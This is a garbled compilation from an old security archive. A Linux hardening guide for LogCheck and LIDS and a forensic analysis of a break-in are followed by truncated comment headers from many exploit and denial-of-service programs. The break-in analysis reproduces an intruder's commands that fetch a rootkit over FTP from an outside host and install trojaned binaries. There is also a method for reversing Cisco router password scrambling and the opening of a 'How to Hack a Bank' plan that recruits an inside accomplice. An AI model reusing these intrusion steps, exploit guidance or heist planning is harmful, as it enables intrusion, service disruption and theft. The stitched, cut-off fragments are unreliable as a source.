       LogCheck (http://www.psionic.com/abacus/logcheck/) is a useful program for scanning system logs for unusual activity. LogCheck works by scanning the various system log files (under Linux these are located in /var/log), and
       notifying the system administrator by e-mail if there is any unusual activity. Unusual messages in the log files can often be generated by intrusion attempts, or actual intrusions against your system.
      
       Installing LogCheck
      
       LogCheck is available in RPM format from the Red Hat contrib archives, and from the same sources as PortSentry. Installing LogCheck from the RPM file or from the source code (read the INSTALL file provided with the source
       code) is relatively simple.
      
       Configuring LogCheck
      
       LogCheck has four main configuration files. In the RPM version, these are stored in the /etc/logcheck directory. Normally, only the logcheck.ignore and the logcheck.violations.ignore files need modification. The normal process
       that I go through after installing LogCheck is as follows:
      
            Allow LogCheck to run once with the standard configuration files. This willl produce a large output file, which can be thrown away.
      
            24 hours later, allow LogCheck to run again. This will detect any new entries in the log files since the last run, and will produce a smaller but still sizeable output file. Read this file carefully.
      
            For entries in the file that are of no great concern (use your judgement for this) find a specific identifying string in the entry. For entries that are in the "Security Violations" section, add the identifying string to the
            logcheck.violations.ignore file. For other entries (in the "Unusual System Events" section), add the string to the logcheck.ignore file.
      
            Repeat this process, once every 12 - 24 hours for approximately a week. By this stage, enough "bogus" entries will be filtered out by the strings that you have added to the .ignore files that the daily LogCheck report will
            contain only genuine system concerns.
      
       Note that the RPM file specifies that LogCheck is to be run hourly, but normally I only run it daily except on critical systems that need regular monitoring. This is done by moving the /etc/cron.hourly/logcheck file into /etc/cron.daily.
      
       Kernel Based Intrusion Detection
      
       Kernel based intrusion detection is a relatively new art form for Linux. The main kernel based intrusion detection system currently available is called LIDS, and is available from http://www.lids.org/.
      
       What is LIDS?
      
       LIDS is an intrusion detection and prevention system that resides within the Linux kernel.
      
       LIDS' protection is aimed at preventing the root user (who would normally have access to the entire system) from tampering with important parts of the system. LIDS' most important features include increased file system
       protection, protection against direct port access or direct memory access, protection against raw disk access, and protection of log files. LIDS also prevents certain system actions, such as installing a packet sniffer or changing
       firewall rules.
      
       LIDS Documentation
      
       The LIDS system is somewhat more complex to install than either PortSentry or LogCheck. Fortunately, the LIDS web site contains quite good documentation on the LIDS project, including installation and configuration
       instructions.
      
       Installing LIDS
      
       First, before installing LIDS, make sure that you have the most up to date LIDS patch (I am using 0.9), and the correct kernel version. I am using the updated kernel (2.2.14-12) from the Red Hat Updates FTP site, because this
       contains some security fixes. You also need the source code for the kernel that you are using.
      
       LIDS is currently targeted towards the 2.2.14 kernels. I installed LIDS on a Red Hat 6.2 system, this includes the 2.2.14 kernel. Before I installed LIDS, I obtained the updated kernel (from ftp.redhat.com/updates/ or one of its
       mirrors) and installed it according to the instructions at http://www.redhat.com/support/docs/howto/kernel-upgrade/kernel-upgrade.html.
      
       The next thing I obtained was the updated kernel source, which also came from ftp.redhat.com/updates/ This I installed using:
      
                rpm -Uhv kernel-source-2.2.14-12.i386.rpm
      
       Next, compile and install the lidsadm program:
      
                cd /usr/local/src/security/lids-0.9/lidsadm-0.9
                make
                make install
      
       Generate a RipeMD-160 password that will later be installed into the kernel:
      
                lidsadm -P
      
       I entered the password "anypass" and got back the key "d502d92bfead11d1ef17887c9db07a78108859e8".
      
       Next, I copied the standard Red Hat configuration file for my architecture into the /usr/src/linux directory:
      
                cd /usr/src/linux/configs/
                cp kernel-2.2.12-i686.config ..
      
       Next, I installed the LIDS patch using the following commands:
      
                cd /usr/src
                patch -p0 </usr/local/src/security/lids-0.9/lids-0.9-2.2.14-redhat.patch
      
       Note that the Red Hat supplied kernel is slightly different from the standard 2.2.14 kernel distributed by Linus, as it contains some updated drivers. The lids-0.9-2.2.14-redhat.patch file that is available is slightly different to the standard
       lids-0.9-2.2.14.patch file distributed with LIDS, as the latter will not apply cleanly to Red Hat's kernel.
      
       Finally, I configured, compiled, and installed the kernel:
      
                cd /usr/src/linux
                make menuconfig
                make dep; make clean
                make
                install; make modules; make modules_install
      
       The following script shows the LIDS configuration options that I chose during the kernel configuration:
      
                [*] Linux Intrusion Detection System support (EXPERIMENTAL)
                --- LIDS features
                [ ] Hang up console when raising a securit alert
                [*] Security alert when execing unprotected programs before sealing
                [ ] Do not execute unprotected programs before sealing LIDS
                [*] Enable init children lock feature
                [*] Try not to flood logs
                (60) Authorised time between two identic logs (seconds)
                [*] Allow switching LIDS protections
                RipeMD-160 encrypted password: d502d92bfead11d1ef17887c9db07a78108859e8
                (3) Number of attempts to submit password
                (3) Time to wait after a fail (seconds)
                [*] Allow remote users to switch LIDS protections
                [ ] Allow any program to switch LIDS protections
                [*] Allow reloading config. file
                [ ] Hide some known processes
                [*] Port Scanner Detector in kernel
                [ ] Send security alerts through network
                --- Special authorizations
                [ ] Allow some known processes to access /dev/mem (xfree, etc.)
                [ ] Allow some known processes to access raw disk devices
                [ ] Allow some known processes to access io ports
                [ ] Allow some known processes to change routes
                --- Special UPS
                [*] Allow some known processes to unmount devices
                Allowed processes: "/etc/rc.d/init.d/halt;/etc/rc.d/init.d/netfs"
                [*] Unmounting capability is inherited
                [*] Allow some known processes to kill init children
                Allowed processes: "/etc/rc.d/init.d/halt"
                [*] Killing capability is inherited
      
       Note that since I don't have a UPS, am running a headless server (no X installed), and need to access this system remotely, I chose the configuration options above. The options that you choose for your environment may vary.
      
       Configuring LIDS
      
       One important note: After compiling the kernel you must configure LIDS before you next reboot!
      
       LIDS stores its configuration in the /etc/lids.conf file. This file should never be edited by hand, instead, you should configure LIDS by using the lidsadm program.
      
       Running "lidsadm -h" gives a page or so of help as to how to use the lidsadm program. The LIDS documentation (on the LIDS web site) gives some examples of using LIDS to protect files, for example:
      
                lidsadm -A -r /sbin
      
       ... which protects (marks read-only) the entire /sbin directory.
      
       My preferred LIDS configuration script looks like this:
      
                lidsadm -Z
                lidsadm -A -r /usr/bin
                lidsadm -A -r /bin
                lidsadm -A -r /usr/sbin
                lidsadm -A -r /sbin
                lidsadm -A -r /usr/X11R6/bin
                lidsadm -A -r /etc/rc.d
                lidsadm -A -r /etc/sysconfig
      
       Once the LIDS system has been configured, you need to update your boot scripts to ensure that the "lidsadm -I" command is run during the boot process. This effectively "starts" the LIDS functions in the kernel. I normally place
       lidsadm at the end of the /etc/rc.d/rc.local script, as this ensures that the LIDS functionality doesn't prevent the rest of the system scripts from operating correctly.
      
       This is the command line that I use at the end of /etc/rc.d/rc.local to start LIDS:
      
            /sbin/lidsadm -I -- -CAP_SYS_MODULE -CAP_SYS_RAWIO -CAP_SYS_ADMIN \
                                -CAP_SYS_PTRACE -CAP_NET_ADMIN -CAP_LINUX_IMMUTABLE \
                                +INIT_CHILDREN_LOCK
      
       Configuring LILO
      
       Note that since the Kernel was updated using Red Hat's RPMs, you will need to follow the instructions in the Red Hat kernel upgrading web page mentioned above to modify the /etc/lilo.conf file. This will ensure that the new kernel
       that has been compiled with LIDS functionality will be the one booted when your system reboots.
      
       After Reboot
      
       After the next reboot, LIDS will be running on your system. If you need to stop LIDS to perform system administration tasks, then you should use one of the following commands:
      
                /sbin/lidsadm -S -- -LIDS
      
       or
      
                /sbin/lidsadm -S -- -LIDS_GLOBAL
      
       You will need to provide the LIDS password, which was inserted into the kernel in RipeMD-160 format during the kernel compile.
      
       You will also note that on shutdown, most of the shutdown scripts will fail. This is normal. The final shutdown script (/etc/rc.d/init.d/halt) will kill all of the processes and unmount the file systems. No other process will be allowed to
       kill any of the children of the init() process, due to the "+INIT_CHILDREN_LOCK" protection made in the rc.local file (above).
      
       Also, every 10 minutes, you will get an error message about "rmmod \as" being unable to remove a module. This is because the "-CAP_SYS_MODULE" protection stops insertion or removal of modules once LIDS has started. To
       stop the error message happening, delete the /etc/cron.d/kmod file.
      
       What Can LIDS Protect?
      
       A quick read through the LIDS documentation will reveal the full set of features in LIDS. The most important features, in my opinion, include the following:
      
            CAP_LINUX_IMMUTABLE, which protects the files and file systems from being written to when marked "immutable".
      
            CAP_NET_ADMIN, which prevents tampering with the network configuration (eg: prevents route table entries from being changed, and prevents firewall entries from being tampered with).
      
            CAP_SYS_MODULE which prevents insertion and removal of kernel modules.
      
            CAP_SYS_RAWIO which prevents raw disk/device I/O.
      
            CAP_SYS_ADMIN which prevents a large range of other system administration functions.
      
            INIT_CHILDREN_LOCK which prevents child processes of the init() master process from being tampered with.
      
       All of the above features can be turned on at any point using "lidsadm -I". The features can also be disabled at any point (to allow the real system administrator access to the system configuration) by using "lidsadm -S", and
       providing the LIDS password which was installed into the kernel (and encrypted with RipeMD-160).
      
       Anatomy of a Break In
      
       I was recently asked to examine a system that had been hacked, to determine the cause of the break-in, and to determine what damage the hacker had done to the system. Fortunately, the system was hacked by someone who
       was not particularly clever, and didn't manage to conceal their tracks entirely.
      
       The break-in occurred when the hacker overflowed the buffer of a system daemon running as root (in fact one that should not have been running on the system at all, but the person who installed Linux was careless and left it
       running, and also failed to install Red Hat's released updates which would have fixed the buffer overflow problem). The hacker, however, was also careless in that when they managed to open a shell (BASH) on the hacked system
       following the break-in, they forgot that the BASH shell logs all activity to a .bash_history file for use by the command line recall functions. A simple read through /.bash_history revealed exactly what the hacker had done while
       logged on to the system.
      
       The file read as follows (edited slightly for brevity):
      
                mkdir /usr/lib/... ; cd /usr/lib/...
                ftp 200.192.58.201 21
                cd /usr/lib/...
                mv netstat.gz? netstat.gz; mv ps.gz? ps.gz; mv pstree.gz? pstree.gz;
                mv pt07.gz? pt07.gz; mv slice2.gz? slice2.gz; mv syslogd.gz? syslogd.gz;
                mv tcpd.gz? tcpd.gz
                gzip -d *
                chmod +x *
                mv netstat /bin ; mv ps /bin ; mv tcpd /usr/sbin/; mv syslogd /usr/sbin;
                mv pt07 /usr/lib/; mv pstree /usr/bin ;
                /usr/lib/pt07
                touch -t 199910122110 /usr/lib/pt07
                touch -t 199910122110 /usr/sbin/syslogd
                touch -t 199910122110 /usr/sbin/tcpd
                touch -t 199910122110 /bin/ps
                touch -t 199910122110 /bin/netstat
                touch -t 199910122110 /usr/bin/pstree
                cat /etc/inetd.conf | grep -v 15678 >> /tmp/b
                mv /tmp/b /etc/inetd.conf
                killall -HUP inetd
      
       Reading through this file, we can note the following activity:
      
            A directory with an unusual name (/usr/lib/...) was created on the system. An FTP connection was made back to the hacker's personal machine (200.192.58.201, traced to a dial-in address somewhere in Brazil), and a
            simple hacker-kit was downloaded.
      
            The hacker kit was uncompressed. It contained trojan binaries which were then installed on the system.
      
            The trojan binaries were used to over-write the system versions of netstat, ps, tcpd, syslogd, and pstree. These are programs that get used to report on system activity, show running processes, show open ports, etc.
      
            A backdoor process of some kind (/usr/lib/pt07) was installed and started. Note that since the hacker has installed his or her own versions of ps, pstree, and netstat, this trojan is probably invisible to the system.
      
       What Can We Learn From This?
      
       Firstly, note that LIDS would not have prevented the actual break-in. The hacker obtained root access to the machine by connecting to and overflowing a buffer in a process that was running as root.
      
       Once the hacker had broken in, we can note how LIDS would have minimised the damage:
      
            LIDS, by using the CAP_LINUX_IMMUTABLE option, would have prevented the trojan binaries from being written to /bin, /usr/bin, /usr/sbin, and /usr/lib. These are directories that we would normally mark as immutable (chattr
            +i) and hence could not have been changed. Note that even without LIDS we can mark these directories as immutable using chattr +i, but LIDS prevents even the root user from tampering with the immutable flag.
      
            Similarly, the touch -t commands would have failed if the files were marked chattr +i.
      
            Even the very first line of the script, "mkdir /usr/lib/..." would have failed if the /usr/lib directory was marked immutable!
      
       Note that LIDS would not have prevented the break-in, but would have prevented the hacker from causing any significant system damage after the break-in. A backdoor process could have been installed (eg: the pt07 backdoor
       could have been placed in /tmp, or any other non-immutable directory), but the non-trojan versions of ps, netstat, and pstree would have detected this process fairly easily and we could have come back and killed it off.
      
       Without LIDS being installed we have no other real clues as to what the hacker might have done via this backdoor, and so our only available method to clean up the hacker's damage is to re-install the system completely.
      
       OpenWall and LIDS: An Extra Layer
      
       Another similar system to LIDS is the OpenWall project (http://www.openwall.com/linux/). The OpenWall project contains some different security features to LIDS, and one of the OpenWall patches in particular makes the stack area
       non-executable. An excerpt from the OpenWall README file states:
      
            Most buffer overflow exploits are based on overwriting a function's return address on the stack to point to some arbitrary code, which is also put onto the stack. If the stack area is non-executable, buffer overflow
            vulnerabilities become harder to exploit.
      
            Another way to exploit a buffer overflow is to point the return address to a function in libc, usually system(). This patch also changes the default address that shared libraries are mmap()'ed at to make it always contain
            a zero byte. This makes it impossible to specify any more data (parameters to the function, or more copies of the return address when filling with a pattern), -- in many exploits that have to do with ASCIIZ strings.
      
       Recently, the LIDS web site has contained some integrated LIDS + OpenWall kernel patches that apply the security features of both LIDS and OpenWall to the kernel in a single integrated patch set.
      
       Conclusions
      
       Using a set of layered security tools on the Linux system, it is possible to prevent a wide range of system attacks, and to protect your system against intrusion or tampering. A hacker's point of entry into your system will be the
       network interfaces, and protecting these, and under the network interfaces, the system kernel, can discourage many attacks and prevent others.
      
       Be aware of any potential security holes in your system. Any daemon or service running on your system, either as root or as a non-root user, can be a potential security threat. Be prepared to face attacks against these threats.

232.0 [IND] scan.txt Spitzner gets an unusual scan.
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Recently my network received an unusual scan, deciphering
      it has proven difficult.  With some outstanding help
      from the security community, here is my best guess at
      what the scan is.
      
      THE SCAN
      --------
      On 20 May, one of my systems received a unique scan from
      three systems.  The three systems are:
      
      jive.rahul.net    (192.160.13.4)
      bug.rahul.net     (192.160.13.7)
      foxtrot.rahul.net (192.160.13.6)
      
      The scan signature is exactly the same from all three systems,
      they scanned ports 1-1024 (see signature below).  Of these
      three systems, one is not active (jive.rahul.net) so we
      know for certain that at least one system was spoofed. The
      other two systems (bug and foxtrot) are up.  This was confirmed
      both by hping and by the system owner, Rahul Dhesi <dhesi@rahul.net>
      However, I do not know if the two live systems were spoofed or not.

      05/20-17:06:45.061034 192.160.13.4:31337 -> 172.16.1.101:1
      TCP TTL:44 TOS:0x10 ID:242 
      ***FRP** Seq: 0xA1D95   Ack: 0x53   Win: 0x400

      05/20-17:06:58.685879 192.160.13.4:31337 -> 172.16.1.101:1024
      TCP TTL:44 TOS:0x10 ID:242 
      ***FRP** Seq: 0xA1D95   Ack: 0x53   Win: 0x400
      
      --- snip snip ---
      
      THE TOOL
      --------
      These packets were crafted by a tool, they were not created by
      a standard IP stack. We can determine this based on the following:
      
      1.  The Seq, Ack, and IP ID numbers are the same for all 1024 packets.
          An IP stack would have increasing numbers for all three.
      
      2.  Note the TCP flags, FIN, RST, and PSH.  No standard IP stack would
          produce such a packet, nor would any IP stack respond with such a packet.
      
      Many people commented that this was Back Orrifice because the 31337 port,
      but that is not the case.  First, BO uses UDP by default.  Also, Dildog had 
      this to say about the scan:
      
      "A bo2k scanner would never come -from- port 31337.  Something might scan 
       -you- for sockets listening on 31337, but not the other way around. 
       Regardless, this would have been BO, not BO2K, since BO2K doesn't have 
       a default port. This just looks like a regular port scan to me with a 
       fixed local port."
      
      So, this scan was most likely done by a scanner that creates its own packets,
      but which one?
      
      Not nmap:  Nmap does not have a FRP flag option.  Nor does it use constant
                 Seq, Ack, and IP ID numbers.
      Not hping: Hping can set most of the functionality of this scan, but it CANNOT
                 set the Seq or Ack number.
      
      The best guess we have among the security community is these signatures were
      created by Libnet, some one has created their own packets.  Why Libnet?  
      To qoute Simple Nomad (and Aaron Campbell)
      
      "I thought these values looked familar. Took me a bit, but check out the
       sample programs that come with Libnet. In there you will find id 242, seq
       a1d95, ack 53, and a ttl of 48. Looks like someone was playing around
       trying to write a scanner of sorts using the Libnet sample progs as a
       starting point, and scanned you. So check every machine 4 hops away...."
      
      NOTE: I tried the traceroute 4 hops out, it was a router, most likely not
            our suspect :(
      
      So, based on what we know, our best guess is that Libnet was used to create
      these packets.
      
      PURPOSE OF THE SCAN
      -------------------
      This is the most confusing part, the TCP Flags FRP do not generate a response,
      from open or closed ports. This has been tested on a variety of systems by
      a several people, inlcuding Max Vision, Dennis Ducamp,  and myself.  So 
      why run a scan when you won't get any results?  I do not know.  Maybe
      someone was testing their coding or scanning skills.  Perhaps they were
      trying "man-in-the-middle" scan techniques.  We may never know :(
      
      
      K2 from ADM CREW has an interesting theory
      
      "Well, not really, what if your not using the TCP/IP stack of the OS but rather
       something like libpcap backdoor and are looking for weirdo options ( this will
       enable you to communicate through onto a firewall'd system )... he dose use
       libnet to communicate with it so it lead's me to believe that he wants to have a
       sub-carrier connection that is not normally valid.  Source port significance is
       a really good way to authenticate to a backdoor (ip independent), and can be
       detected by the trojan early (able to bypass system logging).
      
       Exactally, libpcap based backdoor with a libnet based client to pipe i/o to the
       backdoor... I dont know why they would scan all the ports other then to assume
       that the backdoor on the host may modulate the port it's listening on... also, a
       system like this could listen on a port already allocated by the system like
       even if telnetd is running... you can still contact your backdoor on port 23
       because your connect to that port is not valid to anything that the system would
       have there (your basically going up your libpcap stack insted of the OS), this
       also helps get past any host firewall."
      
      A comment from the system owner Rahul Dhesi, who has been extremely 
      helpful with this analysis.
      
      "Hi, I don't see any obvious signs of a break-in on bug.rahul.net
       or foxtrot.rahul.net.  Also, they are running different OSs:
       foxtrot is SunOS 4.1.3_U1, while bug is FreeBSD 3.4-STABLE.
       It seems doubtful to me that somebody would break into two machines
       running different OSs at around the same time.  if somebody really
       broke into one of them, he would likely attack other machines
       on the network running the same OS.  So I'm guessing that all 
       packets were spoofed."
      
      Side note, FRP packets are not entered in the state table for FW-1 
      firewall.  Even though the packet may be accepted and logged, the packet 
      would not enter the FW-1 state table.

233.0 [IND] local ssh 1.2.27 dos attack.

      #     vulnerable: SSH 1.2.27
      #
      # A vulnerability in SSH's creation of the authentication
      # agent UNIX domain socket allows local users to create a
      # UNIX  domain socket with  an arbitrary file name in the
      # system.
      #
      # SSH has  the concept of authentication proxying via the
      # SSH authentication agent. It allows for a basic kind of
      # Single Sign-On capability. The sshd daemon, ssh and ssh
      # -agent communicate via a UNIX domain socket normally of
      # the  form  '/tmp/ssh-<username>/agent-socket-<pid>'.
      #
      # SSH follows symbolic links while creating the socket as
      # root thus  allowing any local  users with ssh access to
      # create  a  socket  with  an  arbitrary  filename in the
      # system.
      #
      # Notice  that  this  will  not  work under all operating
      # systems. Some operating systems  do not follow symbolic
      # links during bind on UNIX domain  sockets. Linux 2.0.x,
      # Solaris 2.5.1  and  IRIX 6.5.2  do  not follow symbolic
      # links during bind(2). Linux 2.1.x does.

      #  Pull router configs via tftp for cisco's and ascends. obviously trivial to
      #  modify this for other network hardware that supports this type of thing.
      #
      #  - [type] can be one of cisco | ascend currently
      #  - defaults to cisco
      #  - requires cmu snmp utilities (snmpset specifically)
      #  - use TFTPLISTEN and disable tftp from /etc/inetd.conf if you want to
      #    launch a 'temporary' in.tftpd just to grab the file.
      #  - 'pidof' only exists on linux that I know of which kindof makes this a 
      #    linux-only tool, unless/until I decide to stop relying on it.
      #  - Set 'INT' to whatever your routable IP is.
      #  - run as root (if you want to launch the tftp server)
      #
      #  - I know this is lame... but it works (most of the time).

       *              the Razor team (NTBugtraq, 19-May-00)
       *              (MS00-029).  This code causes cpu utilization
       *              to go to 100%.
       *
       * Tested against: Win98; NT4/SP5,6; Win2K
       *
       * Written for: My Linux box.  YMMV.  Deal with it.

       * This program exploits a vulnerability in the 'ksu' utility included

       * Since krb5_parse_name will reject input with an @ or /, this shellcode
       * execs 'sh' instead of '/bin/sh'.  As a result, a copy of 'sh' must

       * written April 8, 2000
       * Jim Paris <jim@jtan.com>
       *
       * This program exploits a vulnerability in the 'krshd' daemon included
       * with the MIT Kerberos distribution.  All versions are apparently
       * vulnerable.
       *
       * This exploit is for Linux/x86 with Kerberos version 1.0, but you'll
       * probably need a fair bit of coaxing to get it to work.
       *
       * And yes, it's ugly.  I need to accept an incoming connection from the
       * remote server, handle the fact that the overflow goes through two
       * functions and a toupper(), make sure that certain overwritten pointers
       * on the remote host's stack are set to valid values so that a strlen
       * call in krb425_conv_principal() doesn't cause a segfault before we
       * return into the shellcode, adjust the offset depending on the remote
       * hostname to properly align things, etc etc.  As a result, you'll
       * probably have a hard time getting this to work -- it took a lot of
       * hacking and hardcoded numbers to get this to work against my test
       * systems.

       * Thanks to Secure Networks.  See SNI-26: Ascend Router Security Issues
       * (http://www.secnet.com/sni-advisories/sni-26.ascendrouter.advisory.html)
       *
       * Sends a specially constructed UDP packet on the discard port (9)
       * which cause Ascend routers to reboot.  (Warning! Ascend routers will
       * process these if they are broadcast packets.)
       *
       * Compiled under RedHat 5.0 with glibc.
       *
       * NOTE: This program is NOT to be used for malicous purposes.  This is
       *       intenteded for educational purposes only.  By using this program
       *       you agree to use this for lawfull purposes ONLY.
       *
       * It is worth mentioning that Ascend has known about this bug for quite
       * some time.
       *
       * Fix:
       *
       * Filter inbound UDP on port 9.

      /*
      
        Hi All, just a bit of a security notification.
      
        Cisco has been informed of this problem and Im waiting for a fix for the
        problem, Ive also noted that various other firewalls are effected by this
        code, though if you wanna know if whatever you are running is effected,
        you will have to test it.
      
        A brief rundown of the problem.
      
        If you run routable ips on your internal interface on your pix, and
        routeable ips on your external interface, so the pix is not running nat,
        the pix keeps a state table of everything going on.  Anything that is not
        in your state table that attempts to come in from the outside is denied,
        even if there is a conduit in place to permit anything.  Which means that
        you have to establish a connection from your internal network to your
        external network before anything external can send data back.  This is a
        really nice feature, unfortunatly there is a big of a bug that I found in
        this.  While testing on in house equipment for possible flaws, as we
        continually test various products, I found the following.
      
        On recieving a RST packet (TCP Reset) from a given host with the correct
        source and destination port, the PIX will drop the state entry for that
        particular connection, which means the tcp connection dies due to the fact
        that no state entry the external box can no longer talk to the internal
        box.
      
        So, if we take a standard raw ip packet, give it a tcp header, and set the
        source ip as a machine that your internal box is connected to, and the
        destination ip as your internal machine, set the source port on the
        spoofed ip as the port the person is connected to, set your destination
        port on your destination ip cyclically to possible source ports on his
        side, and send resets, it will drop the persons state table entry, cutting
        him off from the box he is connected to.
      
        Now, the one question I asked when I wrote this, is why does this work,
        why is there no seq/ack checking on RST packets, this was answered in the
        TCP RFC, saying that seq/ack numbers are not checked on RST packets,
        however they are checked on FIN packets, hence using FIN packets for this
        test is futile without sequence prediction code.
      
        There is a simple work around for this problem however, and anyone wishing
        to know the details of that is free to email me at andrew@cnsec.co.za for
        details.
      
        Below I have posted example code to show the exploit and how it works, and
        hopefully this will be useful to someone on this list and help fix a
        fairly nasty denial of service problem.
      
        Many Thanks

      Excuse the crappy coding, this code was written when I was very bored,
      had nothing better to do, and felt like proving the point that automatic
      firewalling is a bad idea.  The code spoofs FIN packets from sequential
      internet hosts, starting at 1.0.0.0 and going right through to
      255.255.255.255, sending 15 packets from each, one packet each to port
      100 to 115.  Feel free to modify this code, if you use the code for
      anything, please give me credit where it is due.

         Cisco IOS deficiency (web-server interface) allows an arbitrary
         router to be rebooted.
      
         1. Create an IP address list (or hostnames).
         2. gcc -o cisconuke cisconuke.c
         3. ./cisconuke ip-address-list
         4. If the target's a Cisco with open TCP/80, it goez b00m.
      
         We use a timeout because, in the event that a host resolves but is
         down, waiting for ETIMEDOUT would slow your DOSing down. Adjust if
         necessary (slow links etc).

      3 Because Ascend has such a strong programming department that would      3
      7 never under any circumstances release a version of their code which     3
      3 contained a bug.                                                        7

      3 Well.  Ascend did it again.  Those pesky non zero length tcp offset's   1
      3 do it everytime!  Are those fault lights available in christmas colors  3

      # When "service password-encryption" is configured into a cisco router and
      # the configuration subsequently viewed, the passwords are no longer printed
      # as plaintext but as strings of randomish-looking garbage.  Analysis of
      # several samples reveals the scrambling algorithm to be trivially weak.
      
      # Dr. Delete derived and published an analysis and decryption program some
      # time ago, but since that didn't seem to be generally available at the time
      # I went looking for it, here is an independent explanation.  This was worked
      # out on PAPER over a plate of nachos in a hotel bar in downtown LA, but
      # still illustrates where a general-purpose "xor" handler can be useful for
      # quickly cracking lame "proprietary" algorithms of this genre.
      
      # Passwords can be up to eleven mixed-case characters.  In the "encrypted"
      # representation, the first two bytes of the long string are a random decimal
      # offset between 0 and 15 into a magic block of characters, and the remaining
      # bytes are ascii-hex representations of the password bytes xored against
      # the character-block bytes from the given offset on down.  The character
      # block is "dsfd;kfoA,.iyewrkldJKDHSUB", which is enough for a maximum-length
      # password at the maximum offset.
      
      # Another character block consisting of "sgvca69834ncxv9873254k;fg87" is
      # located after the first one in the IOS image, which may be relevant to
      # something else and is simply mentioned here for posterity.  It is also
      # interesting to note that the strings "%02d" and "%02x" occur immediately
      # afterward, which in light of the above is another clue.

259.0 [IND] fdmnt-smash2.c slackware 7.0 local exploit by Scrippie.

      /*
         Welcome dear reader - be it scriptkiddy, whose sole intent it is to
         destroy precious old Unix boxes or Assembly Wizard whose sole intent it
         is to correct my code and send me a flame.
      
         The fdutils package contains a setuid root file that is used by the floppy
         group to mount and unmount floppies. If you are not in this group, this
         exploit will not work.
      
         This thingy was tested on Slackware 4.0 and 7.0
      
         Use as: fdmount-exp [offset] [buf size] [valid text ptr]
      
         Since the char * text is overwritten in void errmsg(char *text) we should
         make sure that this points to a valid address (something in the .data
         section should do perfectly). The hard coded one used works on my box,
         to find the one you need use something like:
      
         objdump --disassemble-all $(whereis -b fdmount) | grep \<.data\> \
         cut -d " " -f1
      
         The HUGE number of nops is needed to make sure this exploit works.
         Since it Segfaults out of existence without removing /etc/mtab~ we
         only get one try...
      
         Take care with your newly aquired EUID 0!

      /* coded by eth0 from buffer0verfl0w */
      /* tested by morpha */
      /* *NOTE* Original exploit was coded for winbl0wz *NOTE */
      /*
        Vulnerable:
          War FTPd version 1.66x4 
          War FTPd version 1.67-3
      
        Immune:
          War FTPd version 1.67-4
          War FTPd version 1.71-0
      
        The buffer overflow seems to occur because the bound
        check of the command of MKD/CWD is imperfect. This
        means that although anyone can overflow the statically
        assigned buffer that stores the requested path, you
        cannot overwrite the RET address and therefore it's
        impossible to cause War FTPd to execute arbitrary code.
        However, it is a simple mechanism for performing a Denial
        of-Service against the server.
      
      Solution:
       War FTPd 1.70-1 does fix this problem, but it contains other
       vulnerabilities (see our additional information section).

267.0 [IND] pam_console.c redhat (6.2/6.1/6.0) local exploit.      
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      /*
      
       A vulnerability exists in the pam_console PAM module
       included as part  of any Linux  system running  PAM.
       pam_console exists  to own certain  devices to users
       logging  in  to  the  console  of  a  Linux machine.
      
       It is designed to allow only console users to utilize
       things such as  sound devices. It will  chown devices
       to users  upon  logging in,  and chown  them back  to
       being owned  by root upon logout. However, as certain
       devices do  not have a 'hangup' mechanism, like a tty
       device, it is  possible for a local  user to continue
       to monitor activity on certain devices  after logging
       out. This  could  allow an  malicious user  to  sniff
       other users console sessions, and potentially  obtain
       the root password if the root user logs in  or a user
       su's to root. They could also surreptitiously execute
       commands as the user on the console.
      
       Affected:
        RedHat Linux 6.2, 6.1, 6.0

         routedsex.c by xt of XOR (brandon@james.kalifornia.com)
         DoS attack against the routed daemon.
         
         description:
          i noticed a while back, when i was screwing with routed, that
          RIP packets destined for routed (port 520) caused it to log
          an 'unknown router' error to the system log. if i flooded
          it with the same spoofed IP address, it would just say that
          the last message was logged X times. but, if they're randomly
          spoofed, it logs each one. so this causes a DoS attack against
          the hard drive space of the system. the syslog will eventually
          fill up. run this program a couple of times against a host to
          make the system log fill up even quicker. here's an excerpt from
          the /var/log/syslog file on my system:
            ... routed[3067]: packet from unknown router, 45.138.23.14
          and many, many, many more.. 800K file so far after 40 seconds
          of attacking it.
      
         this has been tested on slackware linux 7.0. should work on all
         linux, may need a couple of tweaks to compile on some distributions,
         such as the ever so crappy RedHat and it's clones (i *HATE* redhat).
      
         anyways, have fun. btw, XOR is looking for more members.. if you're
         interested in joining, read http://xorteam.cjb.net.

274.0 [IND] netprex.c Solaris (2.6/7) local overflow by cheez whiz.(fixed)
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      /**
      ***  netprex - SPARC Solaris root exploit for /usr/lib/lp/bin/netpr
      ***
      ***  Tested and confirmed under Solaris 2.6 and 7 (SPARC)
      ***
      ***  Usage:  % netprex -h hostname [-o offset] [-a alignment]
      ***
      ***  where hostname is the name of any reachable host running the printer
      ***  service on TCP port 515 (such as "localhost" perhaps), offset is the
      ***  number of bytes to add to the %sp stack pointer to calculate the
      ***  desired return address, and alignment is the number of bytes needed
      ***  to correctly align the first NOP inside the exploit buffer.
      ***
      ***  When the exploit is run, the host specified with the -h option will
      ***  receive a connection from the netpr program to a nonsense printer
      ***  name, but the host will be otherwise untouched.  The offset parameter
      ***  and the alignment parameter have default values that will be used
      ***  if no overriding values are specified on the command line.  In some
      ***  situations the default values will not work correctly and should
      ***  be overridden on the command line.  The offset value should be a
      ***  multiple of 8 and should lie reasonably close to the default value;
      ***  try adjusting the value by -640 to 640 from the default value in
      ***  increments of 64 for starters.  The alignment value should be set
      ***  to either 0, 1, 2, or 3.  In order to function correctly, the final
      ***  return address should not contain any null bytes, so adjust the offset
      ***  appropriately to counteract nulls should any arise.

      How to Hack a Bank
      
      Electronically knocking over a financial institution isn't easy, but it's probably not as hard as you think.[1] let's get to work 
      
      By David H. Freedman 
      
      
      STEP ONE: THE SETUP 
      
      First, we'll pull our core team together. We'll need at least half a dozen software whizzes to do our hacking,[2] including specialists in banking application software, wire transfer networks, IBM MVS, Unix, Sun Microsystems Solaris, or Windows NT (depending on which is controlling the bank's servers), Windows 95 and 98, and security software.[3] We'll also want at least one inside person at the bank.[4] This could be a mid- to low-level employee, a teller, assistant manager in data processing, or a wire transfer clerk. We should have someone experienced in physical security, too, as well as a talented "social engineer" capable of charm and fast talk. 
      
